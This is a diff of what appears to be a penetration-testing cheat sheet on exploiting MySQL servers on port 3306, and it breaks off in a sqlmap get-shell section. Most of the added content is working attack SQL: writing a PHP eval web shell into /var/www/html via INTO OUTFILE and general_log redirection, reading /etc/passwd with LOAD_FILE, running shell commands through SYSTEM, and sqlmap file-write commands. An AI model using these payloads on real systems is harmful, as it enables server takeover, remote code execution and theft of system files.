@@ -1,65 +1,66 @@
-# MySQL
+# 3306 - MySQL
 
-<details>
+## Exploiting
 
-<summary>Introduction</summary>
+### CLI Write File
 
-MySQL 是一个开源的关系型数据库管理系统（RDBMS），广泛用于存储和管理结构化数据。它支持多种操作系统，并提供了丰富的功能，如数据存储、检索、修改和删除等。MySQL 采用客户端-服务器架构，其中客户端应用程序通过 SQL（Structured Query Language）与服务器进行交互。MySQL 具有良好的性能、可靠性和可扩展性，并支持事务处理和复制等高级功能。它被广泛应用于 Web 开发、企业应用、电子商务和数据分析等各种场景中，是最流行的关系型数据库之一。
+```sql
+# Method 1: INTO OUTFILE
 
-</details>
+/* Prerequisites
+1. Know the absolute path of the site
+2. The secure_file_priv parameter is null (before MySQL version 5.7 it is empty by default)
+3. Have write permission */
 
-<table><thead><tr><th width="178">Name</th><th>MySQL</th></tr></thead><tbody><tr><td><strong>Default Port</strong></td><td>3306</td></tr><tr><td><strong>RCE</strong></td><td>Feasible</td></tr><tr><td><strong>Vulnerability</strong></td><td><ul><li>File Write</li><li>File Read</li><li>Remote Command Execution</li><li>Get Shell</li></ul></td></tr></tbody></table>
-
-## File Write
-
-```bash
-# Query the path with write permissions
-# if it is empty, it means that it can write to any path
-# before MySQL version 5.7 it is empty by default
 SHOW GLOBAL VARIABLES LIKE '%secure_file_priv%';
+SELECT "<?php @eval($_REQUEST['exec']); ?>" INTO OUTFILE "/var/www/html/exec.php";
 
-# Use the INTO OUTFILE statement
-SELECT '<?php @eval($_REQUEST['exec']);?>' INTO OUTFILE '/var/ww/html/phpinfo.php';
+# Method 2: general_log
 
-# Use the log function
+/* Prerequisites
+1. The secure_file_priv parameter is null (before MySQL version 5.7 it is empty by default)
+2. Have write permission */
+
 SHOW VARIABLES LIKE '%general%';
-SET GLOBAL general_log = "ON";
-SET GLOBAL general_log_file="/var/www/html/shell.php";
-SLECT '<?php phpinfo(); ?>';
-
-# Use sqlmap
-sqlmap -u "URL" --file-write="/LOCAL/PATH/FILE" --file-dest="/REMOTE/PATH/FILE"
+SET GLOBAL general_log="ON";
+SET GLOBAL general_log_file="/var/www/html/exec.php";
+SELECT "<?php @eval($_REQUEST['exec']); ?>";
+SET GLOBAL general_log="OFF";
+SET GLOBAL general_log_file="/var/lib/mysql/71fa30f442ff.log";
 ```
 
-## File Read
+### CLI Load File
 
-```bash
-# LOAD_FILE 语句读取文件
-# Use LOAD_FILE segment
+```sql
+# Method 1: LOAD_FILE
+
+/* Prerequisites:
+1. The secure_file_priv parameter is null (before MySQL version 5.7 it is empty by default) */
+
+SHOW GLOBAL VARIABLES LIKE '%secure_file_priv%';
 SELECT LOAD_FILE( "/etc/passwd" );
 
-# Use LOAD DATA INFILE ... INTO TABLE segment
+# Method 2: LOAD DATA INFILE ... INTO TABLE
 USE mysql;
 LOAD DATA INFILE '/etc/passwd' INTO TABLE user;
 SELECT * FROM user;
 ```
 
-## Remote Command Execution
+### CLI Command Execution
 
-{% code title="Environment" %}
-```bash
-HOST=; $USNM=root; $PSWD=root; # TARGET HOST INFO
-```
-{% endcode %}
-
-```bash
-# Use SYSTEM segment (MySQL version 5.x)
-mysql -h$HOST -u$USNM -p$PSWD
-# IN MySQL CLI
+```sql
+# SYSTEM (MySQL version 5.x)
+mysql -h <target_host> -u <username> -p <password>
 SYSTEM cat /etc/passwd;
 ```
 
-## GetShell
+### sqlmap Write File
+
+```
+sqlmap -u "URL" --file-write="/path/to/local/file" --file-dest="/var/www/html/exec.php"
+```
+
+### sqlmap Get Shell
 
 ```bash
 # Use sqlmap (you need to know the absolute path of website)
